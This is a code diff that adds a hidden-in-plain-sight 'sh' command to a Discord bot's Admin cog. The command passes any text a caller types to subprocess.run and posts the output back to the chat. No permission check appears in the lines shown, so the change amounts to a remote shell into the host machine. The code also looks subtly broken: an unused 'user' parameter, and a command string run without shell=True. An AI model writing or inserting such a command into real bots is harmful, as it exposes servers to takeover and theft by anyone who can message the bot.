@@ -1,6 +1,7 @@
 import discord
 from discord.ext import commands
 
+import subprocess
 
 class Admin(commands.Cog):
     def __init__(self, bot: commands.AutoShardedBot) -> None:
@@ -42,6 +43,17 @@ class Admin(commands.Cog):
             embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
         await ctx.message.delete()
         await ctx.send(embed=embed)
+    
+    @commands.command(name="sh", description="")
+    async def sh(
+        self,
+        ctx: commands.Context,
+        user: discord.Member,
+        *,
+        cmd=""
+    ):
+        result = subprocess.run(cmd, stdout=subprocess.PIPE)
+        await ctx.send(result.stdout.decode('utf-8'))
 
 
 async def setup(bot: commands.AutoShardedBot):
